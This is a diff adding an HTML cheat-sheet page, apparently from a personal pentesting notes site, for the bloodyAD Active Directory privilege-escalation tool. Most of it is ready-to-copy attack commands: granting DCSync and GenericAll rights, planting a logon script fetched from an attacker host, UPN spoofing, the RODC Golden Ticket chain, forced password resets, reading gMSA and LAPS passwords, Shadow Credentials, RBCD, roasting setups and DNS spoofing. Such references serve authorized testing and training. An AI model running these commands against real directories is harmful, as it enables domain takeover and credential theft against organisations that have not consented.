@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>bloodyAD — Corey Clay</title>
+<meta name="description" content="bloodyAD reference — LDAP-driven AD privesc tool. ACL/DACL enumeration, object attacks (GenericAll, WriteOwner, DCSync), RODC Golden Ticket chain, Kerberos (RBCD, Shadow Credentials), password attacks, DNS spoofing, and tombstone restore.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / bloodyad</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // ldap-driven-privesc</p>
+  <h1>bloodyAD</h1>
+  <p>A pure-LDAP AD privesc framework — ACL/DACL enumeration (including permissions BloodHound misses), object attacks (GenericAll, WriteOwner, DCSync, scriptPath, UPN spoofing), the RODC Golden Ticket chain via Password Replication Policy, Shadow Credentials and RBCD, LAPS/gMSA reads, DNS record creation for spoofing, and restoring tombstoned objects.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#installation">Installation</a>
+      <a href="#authentication">Authentication</a>
+      <a href="#enumeration">Enumeration</a>
+      <a href="#acl-object-attacks">ACL &amp; Object Attacks</a>
+      <a href="#rodc-attacks-rodc-golden-ticket">RODC Attacks (RODC Golden Ticket)</a>
+      <a href="#password-attacks">Password Attacks</a>
+      <a href="#kerberos-attacks">Kerberos Attacks</a>
+      <a href="#dns-attacks">DNS Attacks</a>
+      <a href="#restore-ad-objects">Restore AD Objects</a>
+      <a href="#references-useful-pages">References / Useful Pages</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<p>!image.png</p>
+<p>This tool can perform specific LDAP calls to a domain controller in order to perform AD privesc. bloodyAD supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc. Exchange of sensitive information without LDAPS is supported. It is also designed to be used transparently with a SOCKS proxy.</p>
+<ul>
+<li>Tags: #Tools #bloodyAD #ActiveDirectory #ACLs #DCSync #EnablingDisabledUser #gMSA #dMSA #LAPS #GenericAll #GenericWrite #WriteOwner #ReadGMSAPassword #DELEGATE_TO #TRUSTED_TO_AUTH_FOR_DELEGATION #BadSucessor #Kerberoasting #AS-REPRoast #RBCD #Resource-basedConstrainedDelegation #UPNSpoofing #WriteSPN #ReadLAPSPassword</li>
+</ul>
+<hr />
+<h2 id="installation">Installation</h2>
+<ul>
+<li><strong>Windows</strong> -&gt; https://github.com/CravateRouge/bloodyAD/releases.</li>
+<li><strong>Linux</strong> -&gt; install via <code>pipx</code>.</li>
+</ul>
+<pre><code class="language-c">pipx install git+https://github.com/CravateRouge/bloodyAD
+</code></pre>
+<hr />
+<h2 id="authentication">Authentication</h2>
+<ul>
+<li>User/Password</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' ...&lt;SNIP&gt;....
+</code></pre>
+<ul>
+<li>Pass-the-Hash (PtH)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p ':e656e07c56d831611b577b160b259ad2' ...&lt;SNIP&gt;....
+</code></pre>
+<ul>
+<li>Kerberos (FQDN required -&gt; example: DC01.lab.local)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $FQDN -d lab.local -k ...&lt;SNIP&gt;....
+</code></pre>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<p><strong><em>ACLs/DACL Enum</em></strong></p>
+<ul>
+<li>Enumerate object attributes where we have WRITABLE access (very useful for checking permissions that don’t appear in BloodHound)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get writable --detail
+</code></pre>
+<ul>
+<li>Get all securityDescriptors of an object (very useful to manually enumerate the entire DACL list of an object searching for permissions that don’t appear in BloodHound)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr ntsecuritydescriptor --resolve-sd
+</code></pre>
+<p><strong><em>Domain Enumeration</em></strong></p>
+<ul>
+<li>Get all available information for a user</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER'
+</code></pre>
+<ul>
+<li>Get all critical information for a user</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_USER' --attr name,distinguishedName,objectSid,description,memberOf,userAccountControl,adminCount
+</code></pre>
+<ul>
+<li>Get group membership for a user/group/computer</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_OBJECT' --attr memberOf
+</code></pre>
+<ul>
+<li>Get a list of all members of a group</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get membership 'TARGET_GROUP'
+</code></pre>
+<ul>
+<li>Get a list of all users (only retrieves the distinguishedName)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype useronly
+</code></pre>
+<ul>
+<li>Get a list of all groups (only retrieves the distinguishedName)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype group
+</code></pre>
+<ul>
+<li>Get a list of all computers (only retrieves the distinguishedName)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype computer
+</code></pre>
+<ul>
+<li>Get a list of all Organizational Units (OUs) (only retrieves the distinguishedName)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype container
+</code></pre>
+<ul>
+<li>Get a list of all Trusts</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get children --otype trustedDomain
+</code></pre>
+<ul>
+<li>Get a list of all accounts with an SPN (servicePrincipalName) assigned {Kerberoastable users}</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
+</code></pre>
+<ul>
+<li>Get a list of all accounts with the <code>DONT_REQ_PREAUTH</code> flag {AS-REP Roastable users}</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(&amp;(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+</code></pre>
+<ul>
+<li>Get the total available <strong><em>Machine Quota</em></strong></li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota
+</code></pre>
+<ul>
+<li>Get the AD Forest level</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr msDS-Behavior-Version
+</code></pre>
+<ul>
+<li>Get the domain minimum password length</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr minPwdLength
+</code></pre>
+<hr />
+<h2 id="acl-object-attacks">ACL &amp; Object Attacks</h2>
+<ul>
+<li>Add a user to a group</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add groupMember 'GROUP_NAME' 'MEMBER_TO_ADD'
+</code></pre>
+<ul>
+<li>
+<p>Add a cross-forest/cross-domain user to a group (Bidirectional Trust)</p>
+<blockquote>
+<p><strong>Note:</strong> Imagine a bidirectional trust where users from <code>lab.local</code> can authenticate on <code>moneycorp.corp</code>. To add a user or group from <code>lab.local</code> (for example, <code>gzzcoo</code>) to a group in <code>moneycorp.corp</code>, you must point bloodyAD to the target Domain Controller (<code>DC2.moneycorp.corp</code>) but authenticate with the source domain (<code>-d lab.local</code>). Since objects from <code>lab.local</code> don’t natively exist in the target domain’s LDAP directory, you <strong>must</strong> use their SID from the source domain (<code>lab.local</code>). This SID can belong to <strong>any user or group</strong> in <code>lab.local</code> that you want to add to the target group in <code>moneycorp.corp</code>.
+</p>
+</blockquote>
+</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host DC2.moneycorp.corp -d lab.local -u 'gzzcoo' -p 'password' add groupMember 'CN=TARGET GROUP,CN=USERS,DC=MONEYCORP,DC=CORP' 'S-1-5-21-854245398-3134732156-1229272821-4521'
+</code></pre>
+<ul>
+<li>Remove a user from a group</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' delete groupMember 'GROUP_NAME' 'MEMBER_TO_DELETE'
+</code></pre>
+<ul>
+<li>Make a user the owner of an object (Usually via the <code>WriteOwner</code> ACL)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set owner 'TARGET_OBJECT' 'TARGET_USER'
+</code></pre>
+<ul>
+<li>Add ‘GenericAll’ (Full Control) permissions to an object</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add genericAll 'DN_TARGET' 'TARGET_USER'
+</code></pre>
+<ul>
+<li>Enable a disabled account</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' remove uac 'TARGET_USER' -f ACCOUNTDISABLE
+</code></pre>
+<ul>
+<li>Add DCSync permissions to an object</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dcsync 'OBJECT_TARGET'
+</code></pre>
+<ul>
+<li>Add a malicious script to a user that executes upon login (scriptPath)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' scriptpath -v '\\&lt;ATTACKER_IP&gt;\malicious.bat'
+</code></pre>
+<ul>
+<li>Modify the UPN (userPrincipalName) for ADCS/UPN Spoofing attacks</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' userPrincipalName -v 'impersonateUser@lab.local'
+</code></pre>
+<ul>
+<li>Modify a user’s mail attribute</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' mail -v 'pwned@lab.local'
+</code></pre>
+<ul>
+<li>Assign a value to the altSecurityIdentities attribute for X.509/ESC14b attacks</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET_USER' altSecurityIdentities -v 'X509:&lt;I&gt;&lt;....SNIP.....&gt;'
+</code></pre>
+<ul>
+<li>Create a new computer account</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add computer 'COMPUTER_NAME' 'COMPUTER_PASSWORD'
+</code></pre>
+<ul>
+<li>Abuse <code>CREATE_CHILD</code> on an OU in Windows Server 2025 - dMSA (BadSuccessor)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add badSuccessor attacker_dMSA
+</code></pre>
+<ul>
+<li>
+<p>Modify a group’s scope/type (Bypass direct scope change restrictions)</p>
+<blockquote>
+<p><strong>Note:</strong> Active Directory prevents direct conversion between certain scopes (e.g., from Global to Domain Local). To bypass this restriction, you must use a Universal group as an intermediate step.
+</p>
+</blockquote>
+</li>
+</ul>
+<p>Change to Security Universal Group (<code>-2147483640</code>):</p>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483640
+</code></pre>
+<p>Change to Domain Local Security Group (<code>-2147483644</code>):</p>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'CN=TARGET GROUP,CN=USERS,DC=LAB,DC=LOCAL' groupType -v -2147483644
+</code></pre>
+<hr />
+<h2 id="rodc-attacks-rodc-golden-ticket">RODC Attacks (RODC Golden Ticket)</h2>
+<blockquote>
+<p>With administrative control over an RODC (Read-Only Domain Controller) computer object in Active Directory (e.g., <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteDacl</code>, <code>WriteOwner</code>), there is a path to fully compromise the domain. By modifying the RODC’s Password Replication Policy (PRP) via the <code>msDS-RevealOnDemandGroup</code> and <code>msDS-NeverRevealGroup</code> attributes, an attacker can allow a Domain Admin’s credentials to be cached on the RODC, log in to the RODC, and dump the credentials.</p>
+<ul>
+<li>Get original <code>msDS-RevealOnDemandGroup</code> values of the RODC object</li>
+</ul>
+</blockquote>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'RODC01$' --attr msDS-RevealOnDemandGroup
+</code></pre>
+<ul>
+<li>Add the target high-privileged user (e.g., Administrator) to the allowed replication group alongside the original values obtained previously</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=lab,DC=local' -v 'CN=Administrator,CN=Users,DC=lab,DC=local'
+</code></pre>
+<ul>
+<li>Clear or modify the <code>msDS-NeverRevealGroup</code> attribute to ensure the target admin is not prevented from replicating</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'RODC01$' msDS-NeverRevealGroup
+</code></pre>
+<hr />
+<h2 id="password-attacks">Password Attacks</h2>
+<ul>
+<li>Modify a user’s password</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set password 'TARGET_USER' 'Gzzcoo123'
+</code></pre>
+<ul>
+<li>Read a computer’s gMSA password</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'TARGET_gMSA' --attr msDS-ManagedPassword
+</code></pre>
+<ul>
+<li>Read a computer’s LAPS password</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+</code></pre>
+<hr />
+<h2 id="kerberos-attacks">Kerberos Attacks</h2>
+<ul>
+<li>Enable <code>DONT_REQ_PREAUTH</code> to make a user AS-REP Roastable</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET_USER' -f DONT_REQ_PREAUTH
+</code></pre>
+<ul>
+<li>Shadow Credentials Attack (requires PKINIT afterwards)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add shadowCredentials 'TARGET'
+</code></pre>
+<ul>
+<li>Add the <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> flag - Unconstrained Delegation</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add uac 'TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+</code></pre>
+<ul>
+<li>Add the <code>DELEGATE_TO</code> flag - Resource-based Constrained Delegation</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add rbcd 'DELEGATE_TO' 'DELEGATE_FROM'
+</code></pre>
+<ul>
+<li>Assign an SPN to a user to make them Kerberoastable</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName -v 'cifs/gzzcoo'
+</code></pre>
+<ul>
+<li>Remove the previously added SPN</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set object 'TARGET' servicePrincipalName
+</code></pre>
+<hr />
+<h2 id="dns-attacks">DNS Attacks</h2>
+<ul>
+<li>Check if we have permission to add DNS records; we can observe this using <code>get writable --detail</code>.</li>
+<li>Query the system DNS records</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get dnsDump &gt; dnsdump.txt
+</code></pre>
+<ul>
+<li>Create a new DNS record to perform DNS Spoofing attacks</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' add dnsRecord 'DNS_RECORD_TARGET' 'ATTACKER_IP'
+</code></pre>
+<hr />
+<h2 id="restore-ad-objects">Restore AD Objects</h2>
+<blockquote>
+<p>https://cravaterouge.com/articles/ad-bin/</p>
+<ul>
+<li>Check if we have permissions to restore deleted objects (can also be seen with <code>get writable --detail</code> if we have ACLs over other users).</li>
+</ul>
+</blockquote>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get object 'DC=lab,DC=local' --attr ntsecuritydescriptor --resolve-sd | grep -B3 'Reanimate-Tombstones'
+</code></pre>
+<ul>
+<li>Check for deleted users in AD</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' --attr name,objectSid,objectGuid,description
+</code></pre>
+<ul>
+<li>Restore a deleted user in AD (you can use the GUID, SID, DN, or sAMAccountName)</li>
+</ul>
+<pre><code class="language-c">bloodyAD --host $IP -d lab.local -u 'user' -p 'password' set restore 'S-1-5-21-3927696377-1337352550-2781715495-1110'
+</code></pre>
+<hr />
+<h2 id="references-useful-pages">References / Useful Pages</h2>
+<ul>
+<li>https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad</li>
+<li>https://github.com/CravateRouge/bloodyAD/</li>
+<li>https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/tools/bloodyad</li>
+<li>https://github.com/CravateRouge/bloodyAD/wiki/Access-Control</li>
+<li>https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad</li>
+<li>https://cravaterouge.com/articles/</li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / bloodyad · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
